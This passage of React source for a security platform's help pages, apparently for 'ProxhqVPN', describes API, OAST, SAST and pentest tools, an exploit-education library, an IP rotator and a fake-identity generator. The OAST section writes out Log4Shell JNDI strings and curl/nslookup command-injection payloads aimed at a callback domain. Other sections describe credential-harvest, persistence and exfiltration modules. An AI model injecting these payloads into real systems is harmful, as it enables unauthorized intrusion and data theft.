          <div>• <strong>API6 — Mass Assignment</strong>: Sends extra JSON fields to detect auto-binding vulnerabilities</div>
          <div>• <strong>API7 — Security Misconfiguration</strong>: CORS wildcard, debug mode, verbose errors, stack trace exposure</div>
          <div>• <strong>API8 — Injection</strong>: SQLi, NoSQLi (MongoDB $where), Command Injection in API params</div>
          <div>• <strong>API9 — Improper Assets Management</strong>: Discovers shadow APIs (/v0, /v2, /internal, /debug)</div>
          <div>• <strong>API10 — Insufficient Logging</strong>: Verifies security event logging via canary token injection</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">GraphQL-Specific Tests</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• Introspection enabled detection (leaks full schema)</div>
          <div>• Batch query amplification (denial of service vector)</div>
          <div>• Deep query nesting (circular fragments, alias abuse)</div>
          <div>• Field-level authorization bypass via alias injection</div>
          <div>• Subscription endpoint security</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>API Security Tester</strong> (<code>/api-tester</code>).</li>
          <li><span className="text-primary/30">2.</span> Enter the API base URL and optionally paste an OpenAPI/Swagger spec (auto-discovers endpoints).</li>
          <li><span className="text-primary/30">3.</span> Add authentication: Bearer token, API key header, or cookie.</li>
          <li><span className="text-primary/30">4.</span> Select test categories (all enabled by default).</li>
          <li><span className="text-primary/30">5.</span> Click <strong>Run Tests</strong>. Results stream in real-time per endpoint.</li>
        </ol>
        <Note type="info">Arsenal-tier tool. Import your OpenAPI 3.0 or Swagger 2.0 spec for best coverage — the scanner auto-generates test cases from the spec.</Note>
      </div>
    ),
  },
  {
    id: "oast",
    title: "OAST — Out-of-Band Testing",
    icon: Radio,
    content: (
      <div className="space-y-3">
        <p>OAST (Out-of-Band Application Security Testing) detects vulnerabilities that have no visible response — blind SSRF, blind SQL injection, blind XXE, Log4Shell, DNS rebinding — by waiting for the target to make a callback to your controlled server.</p>
        <h4 className="font-bold text-primary text-[11px]">OAST Callback Server (<code>/oast-server</code>)</h4>
        <p className="text-[10px] font-mono text-primary/83 mb-2">Your dedicated OAST listener. Captures DNS lookups, HTTP requests, and SMTP callbacks from your injected payloads.</p>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>OAST Callback Server</strong> (<code>/oast-server</code>).</li>
          <li><span className="text-primary/30">2.</span> Copy your unique OAST domain (e.g., <code>a1b2c3.oast.proxhq.net</code>).</li>
          <li><span className="text-primary/30">3.</span> Use this domain in your payloads: <code>{"${jndi:ldap://a1b2c3.oast.proxhq.net/test}"}</code></li>
          <li><span className="text-primary/30">4.</span> The server live-updates as callbacks arrive — showing source IP, timestamp, interaction type, and full request.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">OAST Blind Tester (<code>/oast-tester</code>)</h4>
        <p className="text-[10px] font-mono text-primary/83 mb-2">Automates OAST payload injection across multiple vulnerability classes:</p>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Log4Shell</strong>: <code>{"${jndi:ldap://OAST_DOMAIN/log4shell}"}</code> injected into User-Agent, X-Forwarded-For, and 20+ other headers</div>
          <div>• <strong>Blind SSRF</strong>: URL parameters pointing to <code>http://OAST_DOMAIN/ssrf</code></div>
          <div>• <strong>Blind XXE</strong>: DTD with OOB exfiltration via HTTP to OAST domain</div>
          <div>• <strong>Blind SQLi</strong>: DNS-exfiltration payloads for MySQL (load_file + UNC), MSSQL (xp_dirtree), PostgreSQL (COPY TO program), Oracle (UTL_HTTP)</div>
          <div>• <strong>Blind Command Injection</strong>: <code>curl http://OAST_DOMAIN/ci</code>, <code>nslookup OAST_DOMAIN</code></div>
          <div>• <strong>SMTP injection</strong>: header injection payloads that trigger mail server callbacks</div>
        </div>
        <Note type="info">Arsenal-tier tools. OAST is essential for finding vulnerabilities in APIs and web apps with no visible output — these issues are frequently missed by standard scanners.</Note>
      </div>
    ),
  },
  {
    id: "sast-tool",
    title: "SAST — Static Application Security Testing",
    icon: ScanSearch,
    content: (
      <div className="space-y-3">
        <p><strong>SAST Analyzer</strong> (<code>/sast</code>) scans application source code for security vulnerabilities without executing it — identifying injection flaws, hardcoded secrets, insecure crypto, and dangerous function usage directly from the code.</p>
        <h4 className="font-bold text-primary text-[11px]">Supported Languages</h4>
        <div className="grid grid-cols-3 gap-1.5">
          {["JavaScript / TypeScript", "Python", "Java", "PHP", "Go", "Ruby", "C / C++", "C#", "Kotlin", "Swift", "Rust", "Bash / Shell"].map(l => (
            <div key={l} className="text-[9px] font-mono text-primary/75 border border-primary/10 rounded px-2 py-1 text-center">{l}</div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Detection Rules</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>Injection sinks</strong>: eval(), exec(), system(), popen(), innerHTML, document.write, dangerous ORM raw query usage</div>
          <div>• <strong>Hardcoded secrets</strong>: API keys, passwords, private keys in source code and config files</div>
          <div>• <strong>Insecure cryptography</strong>: MD5/SHA1 for password hashing, ECB mode AES, weak PRNG (Math.random()), short RSA keys</div>
          <div>• <strong>SQL injection</strong>: string concatenation in DB queries, format string in SQL, ORM bypass patterns</div>
          <div>• <strong>XSS sources→sinks</strong>: traces user input from request.params to innerHTML/dangerouslySetInnerHTML</div>
          <div>• <strong>Deserialization</strong>: pickle.loads, ObjectInputStream, JSON.parse with prototype pollution</div>
          <div>• <strong>Path traversal</strong>: user input in file paths without canonicalization</div>
          <div>• <strong>SSRF</strong>: URL fetching functions with user-controlled input</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>SAST Analyzer</strong> (<code>/sast</code>).</li>
          <li><span className="text-primary/30">2.</span> Upload a zip of your source code, paste a single file, or enter a public GitHub repository URL.</li>
          <li><span className="text-primary/30">3.</span> Click <strong>Scan</strong>. Findings include file path, line number, vulnerable code snippet, and remediation guidance.</li>
          <li><span className="text-primary/30">4.</span> Filter findings by severity or rule category. Export full report as Markdown.</li>
        </ol>
        <Note type="info">Strike-tier tool. SAST is most effective on code you own — pair it with Dependency Scanner for complete application security coverage.</Note>
      </div>
    ),
  },
  {
    id: "hackanon-guide",
    title: "HackAnon — Exploit Education",
    icon: ScanSearch,
    content: (
      <div className="space-y-3">
        <p><strong>HackAnon</strong> (<code>/hackanon</code>) is an interactive exploit education library covering 15+ major vulnerability classes with step-by-step hacker methodology, detection indicators, and defense recommendations — designed for developers and security researchers.</p>
        <h4 className="font-bold text-primary text-[11px]">Covered Exploit Classes</h4>
        <div className="grid grid-cols-2 gap-1.5">
          {[
            "SQL Injection (error, blind, UNION, time-based, auth-bypass)",
            "Cross-Site Scripting — XSS (reflected, stored, DOM, keylogger)",
            "Remote Code Execution (command injection, reverse shell, Log4Shell)",
            "SSRF (cloud metadata, internal services, bypass techniques)",
            "LFI / Path Traversal (log poisoning → RCE)",
            "IDOR — Insecure Direct Object Reference (enumeration, mass takeover)",
            "JWT Attacks (alg:none, HS256↔RS256, kid injection, claim escalation)",
            "XXE — XML External Entity (file read, SSRF, OOB exfil)",
            "CSRF (form, JSON, SameSite bypass)",
            "SSTI — Server-Side Template Injection (Jinja2, Twig RCE)",
            "Deserialization (Java ysoserial, PHP, Python pickle RCE)",
            "Subdomain Takeover (GitHub Pages, S3, Heroku)",
            "WAF Bypass (encoding, obfuscation, chunked transfer, path confusion)",
            "Passive OSINT Recon (DNS, CT logs, Shodan, GitHub secrets)",
            "Credential Stuffing & Password Spraying",
          ].map(e => <div key={e} className="text-[9px] font-mono text-primary/75 border border-primary/10 rounded px-2 py-1">{e}</div>)}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">What Each Entry Contains</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <strong>How It Works</strong>: Technical explanation of the vulnerability mechanism</div>
          <div>• <strong>Step-by-Step Attack</strong>: Numbered walkthrough with exact commands an attacker would use</div>
          <div>• <strong>Detection Indicators</strong>: How to detect this attack in your logs and monitoring</div>
          <div>• <strong>Defense Recommendations</strong>: Specific code changes and configurations to prevent the vulnerability</div>
          <div>• <strong>Platform Tool Link</strong>: Direct link to the relevant ProxhqVPN tool to test each class on authorized targets</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>HackAnon</strong> (<code>/hackanon</code>).</li>
          <li><span className="text-primary/30">2.</span> Browse the sidebar or use the search to find a vulnerability class.</li>
          <li><span className="text-primary/30">3.</span> Filter by category (Injection, Authentication, Server-Side, etc.) or severity.</li>
          <li><span className="text-primary/30">4.</span> Read the How It Works section, then follow the step-by-step attack to understand the exploit chain.</li>
          <li><span className="text-primary/30">5.</span> Click the green <strong>Test with [Tool Name]</strong> button to launch the relevant ProxhqVPN tool against an authorized target.</li>
          <li><span className="text-primary/30">6.</span> Use the Detection and Defense sections to harden your own applications.</li>
        </ol>
        <Note type="danger">HackAnon is for educational purposes and authorized penetration testing only. Never use these techniques on systems without explicit written permission. Unauthorized attacks are illegal under the CFAA, Computer Misuse Act, and equivalent laws worldwide. ALPHA UNLIMITED TECHNOLOGIES LLC is not liable for misuse.</Note>
      </div>
    ),
  },
  {
    id: "manuals-download",
    title: "Manuals Download Center",
    icon: FileText,
    content: (
      <div className="space-y-3">
        <p>The <strong>Manuals Download Center</strong> (<code>/manuals</code>) provides 10 comprehensive plain-text manuals covering every feature of the ProxhqVPN platform. Available to all active subscribers.</p>
        <h4 className="font-bold text-primary text-[11px]">How to Access</h4>
        <ol className="list-decimal ml-4 space-y-1 text-[10px] font-mono text-primary/83">
          <li>Click <strong>Manuals Download</strong> in the sidebar (under your account navigation).</li>
          <li>Browse manuals by category: VPN &amp; Privacy, Security Tools, Intelligence &amp; Monitoring, Employee &amp; Administration.</li>
          <li>Click <strong>Preview</strong> to see the first 2,000 characters of any manual inline.</li>
          <li>Click <strong>Download</strong> to save the full manual as a <code>.txt</code> file.</li>
          <li>Click <strong>Download All Manuals</strong> to download the complete set.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Available Manuals</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          {[
            { t: "Getting Started Guide", tier: "All", pages: 24 },
            { t: "WireGuard Advanced Configuration", tier: "All", pages: 32 },
            { t: "OmniStrike Penetration Testing Suite", tier: "Pro", pages: 48 },
            { t: "WAF Analyzer", tier: "Pro", pages: 18 },
            { t: "Social & Game Account Breach Tester", tier: "Pro", pages: 28 },
            { t: "Bug Bounty Research Hub", tier: "Pro", pages: 22 },
            { t: "OSINT Recon Engine", tier: "Pro", pages: 20 },
            { t: "Canary Token Generator", tier: "Pro", pages: 16 },
            { t: "SIEM Security Event Log", tier: "Pro", pages: 14 },
            { t: "Employee Procedures & Platform Administration", tier: "All", pages: 20 },
          ].map(({ t, tier, pages }) => (
            <div key={t} className="flex items-center justify-between border border-primary/10 rounded px-2.5 py-1.5">
              <span className="text-primary">{t}</span>
              <span className={`text-[8px] ${tier === "Pro" ? "text-red-400" : "text-green-400"}`}>{pages}pp · {tier}</span>
            </div>
          ))}
        </div>
        <Note type="info">Manuals are proprietary documentation of ALPHA UNLIMITED TECHNOLOGIES LLC. Downloaded files are for your personal reference only — do not share with non-subscribers.</Note>
      </div>
    ),
  },
  {
    id: "omnistrike",
    title: "OmniStrike Pentest Suite",
    icon: Swords,
    content: (
      <div className="space-y-3">
        <p><strong>OmniStrike</strong> (<code>/omnistrike</code>) is ProxhqVPN's all-in-one automated penetration testing suite. It chains reconnaissance, scanning, vulnerability testing, and post-exploitation into a single orchestrated workflow. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Attack Modules</h4>
        <div className="space-y-2">
          {[
            { t: "Phase 1 — Recon", d: "DNS record enumeration (A/AAAA/MX/TXT/NS/CNAME), WHOIS/RDAP lookup, crt.sh certificate transparency scan, Shodan API query, AlienVault OTX passive recon." },
            { t: "Phase 2 — Port Scan", d: "TCP/UDP scan of top-1000 ports. Service fingerprinting using banner grabbing and SYN probes. Routes through VPN tunnel for full anonymity." },
            { t: "Phase 3 — Vulnerability Testing", d: "Per-service exploit checks: web server CVEs, outdated TLS, default credentials, SQL injection on login forms, XSS on input fields, SSRF on URL parameters." },
            { t: "Phase 4 — Attack Chain Correlation", d: "Correlates findings into attack paths: e.g. exposed .env → DB credentials → admin panel → RCE. SVG chain graph visualization." },
            { t: "Phase 5 — Impact Assessment", d: "Scores each finding: CVSS base score, exploitability, business impact. Generates executive summary + full technical findings report." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Post-Exploitation Modules</h4>
        <div className="space-y-1 text-[10px] font-mono text-primary/83 ml-2">
          <div>• <strong>Credential Harvest</strong> — extract credentials from discovered config files, env files, and DB dumps</div>
          <div>• <strong>Lateral Movement Planner</strong> — maps internal network from initial foothold using ARP, DNS, and SMB</div>
          <div>• <strong>Persistence Simulation</strong> — generates PoC cron job / registry run key / systemd timer persistence commands</div>
          <div>• <strong>Data Exfil PoC</strong> — demonstrates DNS-over-HTTPS exfil, ICMP tunnel, and HTTPS C2 patterns</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Report Export</h4>
        <p className="text-[10px] font-mono text-primary/83">Download the full engagement report as <strong>Markdown</strong>, <strong>HTML</strong>, or <strong>JSON</strong>. The HTML report is styled for client delivery. The JSON format is compatible with Jira, Trello, and vulnerability management platforms.</p>
        <Note type="danger">OmniStrike is for authorized penetration testing only. Always obtain explicit written permission from the target organization before running any scan. Unauthorized use is a criminal offense under the CFAA, Computer Misuse Act, and equivalent laws worldwide.</Note>
      </div>
    ),
  },
  {
    id: "ghost-trap",
    title: "Ghost Trap — Counter-Intel",
    icon: Eye,
    content: (
      <div className="space-y-3">
        <p><strong>Ghost Trap</strong> (<code>/ghost-trap</code>) is ProxhqVPN's active counter-intelligence platform. When attackers probe your infrastructure, Ghost Trap identifies them, wastes their time, poisons their tools with false intelligence, and automatically reports them. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">7-Stage Counter-Intel Pipeline</h4>
        <div className="space-y-2">
          {[
            { num: "1", t: "Attacker Probes a Lure Endpoint", d: "Ghost Trap deploys realistic-looking decoy services on common attacker targets: /admin, /wp-login, /.env, /phpinfo, SSH port 22." },
            { num: "2", t: "Tarpit — Wasting the Attacker's Time", d: "Connections to lure endpoints are held open artificially — sending data 1 byte per second. A single attacker connection can be tied up for hours." },
            { num: "3", t: "Deep Fingerprinting", d: "TCP/IP stack fingerprinting, TLS client hello analysis, HTTP header ordering, and browser JA3 hash — identify the attacker's OS, browser, and tool (Nmap, Shodan, Metasploit, Burp)." },
            { num: "4", t: "Poisoned Response", d: "Fake credentials, fake API keys, fake DB dumps, and fake server configs are returned — poisoning the attacker's tooling and intelligence gathering." },
            { num: "5", t: "Embedded Beacon", d: "All poisoned data includes invisible canary tokens. When the attacker uses the fake credentials or opens the fake file, a beacon fires revealing their real IP." },
            { num: "6", t: "Silk Web Trap", d: "Attackers who dig deeper are fed into the SilkWeb infinite decoy maze — an endless labyrinth of fake services, each logging every command." },
            { num: "7", t: "Auto-Block + Authority Report", d: "Attacker IP is instantly blocklisted across all VPN nodes. Optionally: auto-submit to AbuseIPDB, Spamhaus, and generate a CERT/ISP abuse complaint template." },
          ].map(({ num, t, d }) => (
            <div key={num} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">[{num}] {t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Hop Chain Visualization</h4>
        <p className="text-[10px] font-mono text-primary/83">The Hop Chain panel shows each attacker's connection path across your infrastructure — which lure they hit first, which node they pivoted to, how many requests they made, and what was returned at each step. Click any hop to see the full request/response log.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Manual IP Investigator — Investigate Any IP You Spot</h4>
        <p className="text-[10px] font-mono text-primary/83 mb-2">You don't have to wait for an IP to hit your trap first. The <strong>Counter-Intel tab</strong> includes a Manual IP Investigator that lets you paste in any IP address you spotted in your terminal and run the full investigation suite against it immediately.</p>
        <h4 className="font-bold text-primary text-[10px] mt-2">How to Use It</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Open your terminal and run <code>netstat -an</code> or <code>ss -tnp</code> to see active connections. Look for unexpected foreign IPs under <code>ESTABLISHED</code> or <code>TIME_WAIT</code>.</li>
          <li><span className="text-primary/30">2.</span> Copy the suspicious IP address and port number (e.g. <code>185.220.101.47:4444</code>).</li>
          <li><span className="text-primary/30">3.</span> Navigate to <strong>Ghost Trap → Counter-Intel tab</strong>.</li>
          <li><span className="text-primary/30">4.</span> Paste the IP into the <strong>Manual IP Investigator</strong> field and the port into the <strong>Port</strong> field.</li>
          <li><span className="text-primary/30">5.</span> Click <strong>Investigate</strong>. The system immediately runs: port scan (checks your specified port first), OSINT (geo, ISP, ASN, reverse DNS, abuse contact), and prepares counter-beacon payloads.</li>
        </ol>
        <h4 className="font-bold text-primary text-[10px] mt-2">What the Port Scan Reports</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <span className="text-green-400">OPEN</span>: <em>"Port 4444 confirmed OPEN — the connection you saw in netstat is live."</em> The host is actively running that service.</div>
          <div>• <span className="text-amber-400">FILTERED</span>: Port is reachable but firewalled — the connection may be behind a cloud security group or NAT.</div>
          <div>• <span className="text-red-400">CLOSED</span>: Port is now closed — connection was ephemeral, already terminated, or from a rotating IP pool.</div>
        </div>
        <h4 className="font-bold text-primary text-[10px] mt-2">Useful Terminal Commands to Find Suspicious IPs</h4>
        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <div>• <code className="text-primary/60">netstat -an | grep ESTABLISHED</code> — show all active connections</div>
          <div>• <code className="text-primary/60">ss -tnp</code> — same, with the process name that owns each connection</div>
          <div>• <code className="text-primary/60">ss -tnp | grep -v '127\.\|10\.\|192\.168'</code> — filter out local/private IPs, show only external connections</div>
          <div>• <code className="text-primary/60">lsof -i -n -P | grep ESTABLISHED</code> — show all network connections with the program name</div>
        </div>
        <Note type="warn">Ghost Trap's tarpit and deception techniques are passive defensive tools. The auto-block and abuse reporting features are active responses — review the generated reports before sending to verify accuracy.</Note>
      </div>
    ),
  },
  {
    id: "ip-rotator",
    title: "IP Rotator",
    icon: RefreshCw,
    content: (
      <div className="space-y-3">
        <p><strong>IP Rotator</strong> (<code>/ip-rotator</code>) automatically cycles your VPN exit IP address on a configurable schedule. Use it to defeat rate-limiting, bypass IP-based geo-blocks, and prevent traffic correlation across sessions. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Configuration Options</h4>
        <div className="space-y-2">
          {[
            { t: "Rotation Interval", d: "Set automatic rotation every: 5 min / 15 min / 30 min / 1 hr / 3 hr / 6 hr / 24 hr. Or trigger manual rotation at any time via the Rotate Now button." },
            { t: "Exit Node Pool", d: "Choose which node pool to rotate within: All Nodes, Specific Region (US / EU / APAC / LATAM / MENA), or a custom list of node IDs you specify." },
            { t: "Rotation Strategy", d: "Random (default) — picks any node not recently used. Round-Robin — cycles nodes in order. Least-Used — always picks the node with the fewest active peers." },
            { t: "Kill Switch Integration", d: "When rotation is in progress, the kill switch automatically blocks all traffic for the 2–3 seconds of the handshake — preventing any IP leaks during the switch." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Rotation Log</h4>
        <p className="text-[10px] font-mono text-primary/83">The Rotation Log table shows every past rotation event: timestamp, previous node IP, new node IP, exit country, and rotation trigger (auto/manual). The current countdown to the next scheduled rotation is displayed in real time.</p>
        <Note type="info">Rotation causes a 2–4 second VPN reconnection during which the kill switch is active. If you have active long-running connections (SSH sessions, downloads), they will be interrupted. Use manual rotation timing to avoid disruption.</Note>
      </div>
    ),
  },
  {
    id: "alt-identity",
    title: "Alt Identity Generator",
    icon: User,
    content: (
      <div className="space-y-3">
        <p><strong>Alt Identity</strong> (<code>/alt-identity</code>) generates complete, realistic alternative personas for privacy-critical research, penetration testing, and account compartmentalization. Pairs with IP Rotator and VPN Gate for full operational security. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Generated Identity Fields</h4>
        <div className="grid grid-cols-2 gap-2">
          {[
            { cat: "Personal", items: ["Full name (gender/country/locale matched)", "Date of birth (configurable age range)", "SSN-format (non-real, passes format checks)", "Phone number (country prefix matched)"] },
            { cat: "Address", items: ["Street address (real street, fake number)", "City, state/province, postal code", "Country (matches exit node geo by default)", "Time zone (matched to address)"] },
            { cat: "Online", items: ["Username (pronounceable, unique style)", "Email address (configurable domain)", "Password (entropy-configurable)", "Security Q&A pairs (5 random sets)"] },
            { cat: "Payment (Fake)", items: ["Credit card number (Luhn-valid, non-real)", "Expiry date and CVV format", "Bank name (realistic issuer string)", "IBAN / routing number format"] },
          ].map(({ cat, items }) => (
            <div key={cat} className="border border-primary/10 rounded px-2.5 py-2">
              <div className="text-[10px] font-mono font-bold text-primary mb-1">{cat}</div>
              {items.map(i => <div key={i} className="text-[9px] font-mono text-primary/83">• {i}</div>)}
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Saving & Managing Identities</h4>
        <p className="text-[10px] font-mono text-primary/83">Save up to 10 identities per account. Each saved identity can be given a custom label (e.g. "Research Account 1", "Bug Bounty Persona"). Copy any field individually with one click, or copy the full identity as JSON.</p>
        <Note type="warn">Alt Identity data is synthetic — it passes format validation checks but is not real. Do not use fake payment details to actually purchase anything — that constitutes fraud. This tool is intended for privacy research and authorized social engineering simulations only.</Note>
      </div>
    ),
  },
  {
    id: "dark-web-monitor",
    title: "Dark Web Monitor",
    icon: Search,
    content: (
      <div className="space-y-3">
        <p><strong>Dark Web Monitor</strong> (<code>/dark-web</code>) continuously monitors breach databases, dark web marketplaces, and paste sites for your email addresses, cryptocurrency wallets, and personal data. Get alerted the moment your data appears anywhere on the dark web. VPN Basic tier.</p>
        <h4 className="font-bold text-primary text-[11px]">Email Breach Monitoring</h4>
        <div className="space-y-2">
          {[
            { t: "Password Check", d: "Check any password against the HaveIBeenPwned (HIBP) SHA-1 k-anonymity API. Your password is never sent — only the first 5 characters of its hash. Instantly know if a password appears in any known breach." },
            { t: "Email Monitoring", d: "Add up to 10 email addresses for continuous monitoring. Checks against 700+ breach databases. Each breach shows: site name, breach date, data types exposed (passwords, phone, address, credit card)." },
            { t: "Breach Database", d: "Browse all known breaches for monitored emails. Filter by data type, severity, or date. Each entry links to the HIBP database page for full context." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Blockchain Wallet Monitoring</h4>
        <p className="text-[10px] font-mono text-primary/83">Add Bitcoin and Ethereum wallet addresses to monitor for exposure. The panel checks whether each address appears in known blockchain heist databases, sanctioned address lists (OFAC, Chainalysis), and dark web market transaction records.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Set Up Monitoring</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <strong>Dark Web Monitor</strong> (<code>/dark-web</code>).</li>
          <li><span className="text-primary/30">2.</span> In the Email Monitoring panel, click <strong>Add Email</strong> and enter your address.</li>
          <li><span className="text-primary/30">3.</span> Click <strong>Check Now</strong> to run an immediate scan, or wait for the daily automatic scan (runs at 00:00 UTC).</li>
          <li><span className="text-primary/30">4.</span> Enable email alerts to receive notifications when new breaches are detected.</li>
        </ol>
        <Note type="info">ProxhqVPN stores only the SHA-1 hash prefix of your email — never the full address — when querying the breach API. Your monitored addresses are encrypted at rest using AES-256.</Note>
      </div>
    ),
  },
  {
    id: "post-quantum",
    title: "Post-Quantum Cryptography",
    icon: ShieldPlus,
    content: (
      <div className="space-y-3">
        <p><strong>Post-Quantum</strong> (<code>/post-quantum</code>) upgrades your VPN tunnel cryptography to use NIST-standardized post-quantum algorithms that are resistant to attacks from quantum computers running Shor's algorithm. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">The Quantum Threat</h4>
        <p className="text-[10px] font-mono text-primary/83">Current VPN encryption (ECDH key exchange, RSA/ECDSA signatures) will be broken by a sufficiently powerful quantum computer in ≤15 years. The "harvest now, decrypt later" attack is active today — nation-state actors are already recording encrypted VPN traffic to decrypt once quantum computers arrive. Post-quantum algorithms solve this now.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Supported Algorithms (NIST PQC Finalists)</h4>
        <div className="space-y-2">
          {[
            { t: "ML-KEM (CRYSTALS-Kyber)", d: "Module Learning With Errors — replaces ECDH for key encapsulation. Security levels: 512 (AES-128 equiv), 768 (AES-192 equiv), 1024 (AES-256 equiv). Default: ML-KEM-768." },
            { t: "ML-DSA (CRYSTALS-Dilithium)", d: "Module Lattice Digital Signature — replaces RSA/ECDSA for WireGuard peer authentication. Signature size: 2,420 bytes. Default: ML-DSA-65." },
            { t: "SLH-DSA (SPHINCS+)", d: "Hash-based signature scheme with no number-theoretic assumptions. Maximum conservatism — falls back to purely hash-based security if lattice math is somehow broken." },
            { t: "Classic McEliece (optional)", d: "Code-based cryptography with 50+ years of cryptanalysis history. Largest key sizes (~1 MB public keys) but most conservative security assumptions." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Enabling Post-Quantum Mode</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>Post-Quantum</strong> → select algorithm pair (KEM + signature).</li>
          <li><span className="text-primary/30">2.</span> Click <strong>Generate PQ Key Pair</strong> — new ML-KEM public/private keys are generated server-side and injected into your WireGuard config.</li>
          <li><span className="text-primary/30">3.</span> Download the updated WireGuard config and apply it to your devices.</li>
          <li><span className="text-primary/30">4.</span> The Threat Panel shows which quantum attack vectors are now mitigated.</li>
        </ol>
        <Note type="warn">Post-quantum mode increases WireGuard handshake size by ~2–4 KB. This is imperceptible on modern connections but may add 10–20ms on satellite/high-latency links.</Note>
      </div>
    ),
  },
  {
    id: "daita",
    title: "DAITA — Anti-Traffic Analysis",
    icon: EyeOff,
    content: (
      <div className="space-y-3">
        <p><strong>DAITA</strong> (Defense Against AI Traffic Analysis) (<code>/daita</code>) defeats machine-learning-based traffic fingerprinting attacks. Even inside an encrypted VPN tunnel, packet size and timing patterns can identify specific websites and applications. DAITA prevents this. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">How Traffic Analysis Works (and How DAITA Defeats It)</h4>
        <p className="text-[10px] font-mono text-primary/83">Traffic analysis models (WF attacks — Website Fingerprinting) analyze the sequence, size, and timing of encrypted packets. Even with encryption, loading Netflix has a different packet signature than loading Wikipedia. DAITA injects synthetic traffic and reshapes real packets to make all traffic look statistically identical.</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">DAITA Techniques</h4>
        <div className="space-y-2">
          {[
            { t: "Packet Padding", d: "All outbound packets are padded to fixed sizes (256, 512, 1024, or 1448 bytes). The real payload is encrypted inside — the outside pattern is indistinguishable across websites." },
            { t: "Timing Jitter", d: "Random 1–50ms delay is injected per packet, randomizing the inter-packet timing signature that fingerprinting models rely on." },
            { t: "Dummy Traffic Injection", d: "Synthetic cover traffic (PRNG data, dummy HTTPS requests) is added to your tunnel stream. Your real traffic is hidden in the noise." },
            { t: "Constant Bandwidth Mode", d: "Transmits at a fixed bandwidth rate regardless of actual usage — making idle vs active periods indistinguishable." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Threat Panel</h4>
        <p className="text-[10px] font-mono text-primary/83">The Threat Panel lists known traffic analysis attack vectors and shows whether each is mitigated (green) or exposed (orange) with your current DAITA settings. Enable all four techniques for maximum protection.</p>
        <Note type="warn">DAITA increases bandwidth usage by 20–80% depending on Constant Bandwidth mode settings. Set your target bandwidth budget in the configuration to control overhead. Disable for latency-sensitive applications like gaming or VoIP.</Note>
      </div>
    ),
  },
  {
    id: "username-intel",
    title: "Username Intelligence",
    icon: Search,
    content: (
      <div className="space-y-3">
